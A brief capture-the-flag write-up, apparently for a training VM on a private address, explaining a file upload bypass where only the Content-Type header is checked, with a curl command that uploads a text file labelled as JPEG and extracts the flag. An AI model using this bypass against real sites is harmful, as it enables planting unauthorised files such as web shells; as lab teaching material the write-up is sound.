# Exploit 08 - file upload

On the upload page it's possible to upload images. Only the _type_ header of the upload request seems to be checked to ensure the upload is an image.
We can take advantage of that to upload any kind of files on the server.

```bash
curl -s -X POST "http://192.168.56.101/index.php?page=upload" -F "Upload=Upload" -F "uploaded=@"<(echo 'hello')";type=image/jpeg" | grep -oP 'The flag is : \K[0-9a-f]{64}'
```
